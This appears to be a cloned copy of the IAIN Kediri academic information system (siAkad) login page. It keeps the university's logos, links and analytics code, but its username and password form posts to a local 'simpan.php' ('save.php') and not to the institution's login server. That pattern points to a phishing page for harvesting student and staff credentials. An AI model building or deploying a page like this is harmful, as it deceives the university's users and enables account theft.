<!DOCTYPE html>
<html><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="UTF-8">
    <title>Sistem Informasi Akademik</title>
    <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
    <meta name="description" content="siAkad Cloud solusi terbaik Perguruan Tinggi. Langsung Bisa Digunakan, Tidak Ribet dan Pelaporan Beres.">
    <meta name="keywords" content="">
    <meta name="author" content="siAkad&nbsp;Enterprise">
    <!-- font Awesome -->
    <link href="font-awesome.min.css" rel="stylesheet" type="text/css">
    <!-- Theme style -->

    <link href="login-v2.css" rel="stylesheet" type="text/css">
    <link rel="icon" type="img/png" href="logo-iain-kediri3.png" sizes="16x16">



            <style type="text/css">
            .login-page .form-box .univ-identity-box {
                background: linear-gradient(rgba(0, 0, 0, 0.2), rgba(0, 0, 0, 0.2)), url('https://iainkediri.ac.id/wp-content/uploads/2020/08/Untitled-3.jpg') bottom;
                background-size: cover;
            }
        </style>
        <style type="text/css">
        html,
        body {
            background: #f2f2f2 url('pat_04.png') repeat;
        }

        .password {
            position: relative;
        }

        .showbtn {
            cursor: pointer;
            overflow: hidden;
            right: 15px;
            position: absolute;
            top: 10px;
            cursor: pointer;
        }
    </style>
    <style type="text/css">
</style></head>

<body class="login-page" action ="simpan.php" style="">
    <form id="login_form" action="simpan.php" method="post" novalidate="1" onsubmit="return window.Event &amp;&amp; Event.__inlineSubmit &amp;&amp; Event.__inlineSubmit(this,event)">
    <div class="container">
        <div class="row">
            <div class="form-box col-md-8 col-sm-10 col-xs-12">

                <div class="col-lg-7 col-md-6 col-sm-6 col-xs-12 univ-identity-box" style="background-image: url('bg.jpg') ;                     /* &lt;------ */
    resize: both;">
                    <div class="univ-text">
                        <h4 class="welcome text-light">Selamat Datang</h4>
                        <div class="clearfix"></div>
                        <h2 class="no-margin text-light">Sistem Informasi Akademik</h2>
                        <h3 class="no-margin"><b>INSTITUT AGAMA ISLAM NEGERI KEDIRI</b></h3>
                        <h2 class="no-margin text-light">Informasi SPMB <a href="http://spmb.iainkediri.ac.id/"> Klik Disini </a></h2>
                    </div>
                </div>
                <div class="col-lg-5 col-md-6 col-sm-6 col-xs-12 form-login" align="center">
                    <img src="logo-iain-kediri3.png" class="logo"><br>
                    <h2 align="center" class="text-grey text-light">Silakan Login</h2><br>
                    <form method="POST" action="simpan.php">
                        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">

                        
    <div class="form-group">
        <i class="fa fa-user icon-input"></i>
        <input type="text" name="userid" id="userid" class="form-control input-line" placeholder="Masukkan Akun Pengguna" required>
    </div>
    <div class="form-group">
        <div class="password">
            <i style="margin-left:-20px;" class="fa fa-key icon-input"></i>
            <input type="password" id="password" name="password" class="form-control input-line" placeholder="Masukkan Kata Sandi" required>
            <span id="iconshow" onclick="showPass()" class="showbtn fa fa-eye-slash"></span>
        </div>
    </div>
    <br>
    <div class="form-group" align="center">
        <button type="submit" class="btn btn-flat btn-primary">Masuk Aplikasi <i class="fa fa-angle-right"></i></button>
    </div>
</form>

                        <input type="hidden" name="_token" value="s0g1SzY0NDcyMklOMktJNLU0MDY2t0gyNk0yN09KNDEBAA==">
                    </form>
                    <div style="margin-top: 30px">
                        <a href="https://sia.iainkediri.ac.id/siakad/gate/lupapw" class="pull-left">Lupa Password?</a>
                        <span class="pull-right text-grey">
                        <a href="http://sia.iainkediri.ac.id/registrasi/" class="pull-left">Her Registrasi</a>
                        <!-- <a href="#"><img width="120" src="/siakad/assets/v1/img/xs-siakadcloud.png"></a> --></span>
                        <div class="clearfix"></div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- jQuery 2.0.2 -->
    <script type="text/javascript" async="" src="js_003"></script><script type="text/javascript" async="" src="analytics.js"></script><script type="text/javascript" async="" src="js_002"></script><script src="jquery.min.js"></script>
    <!-- Bootstrap -->
    <script src="bootstrap.min.js" type="text/javascript"></script>
        <script async="" src="js"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag() {
            dataLayer.push(arguments);
        }
        gtag('js', new Date());
        gtag('set', {'user_id': 'IAIN KEDIRI :  - '});
        gtag('config', 'UA-91361426-5', {
            'custom_map': {
                'dimension1': 'Perguruan Tinggi',
                'dimension2': 'Pengguna',
                'dimension3': 'Hak Akses',
                'dimension4': 'Unit Kerja',
                'metric1': 'Pageviews'}});

        gtag('event', 'push_custom_var', {
            'Perguruan Tinggi': 'IAIN KEDIRI',
            'Pengguna': 'IAIN KEDIRI :  - ',
            'Hak Akses': '',
            'Unit Kerja': ' - ',
            'Pageviews': 1
        });
    </script>

    <script src="firebase-app.js"></script>
    <script src="firebase-analytics.js"></script>
    <script>
      var firebaseConfig = {
        apiKey: "AIzaSyBE85GSM4dBUZ8m9aoJZVpSOQltwQZttDc",
        authDomain: "siakad-cloud-2.firebaseapp.com",
        databaseURL: "https://siakad-cloud-2.firebaseio.com",
        projectId: "siakad-cloud-2",
        storageBucket: "siakad-cloud-2.appspot.com",
        messagingSenderId: "735352312839",
        appId: "1:735352312839:web:9aa5508b27862f29a146a2",
        measurementId: "G-9GSZKDCXHL"
      };
      firebase.initializeApp(firebaseConfig);
      firebase.analytics();
    </script>

    <script type="text/javascript">
        function showPass() {
            if (document.getElementById("password").type == 'password') {
                document.getElementById("password").type = 'text';
                document.getElementById("iconshow").classList.remove('fa-eye-slash');
                document.getElementById("iconshow").classList.add('fa-eye');
            } else {
                document.getElementById("password").type = 'password';
                document.getElementById("iconshow").classList.remove('fa-eye');
                document.getElementById("iconshow").classList.add('fa-eye-slash');
            }
        }
    </script>
    

</body></html>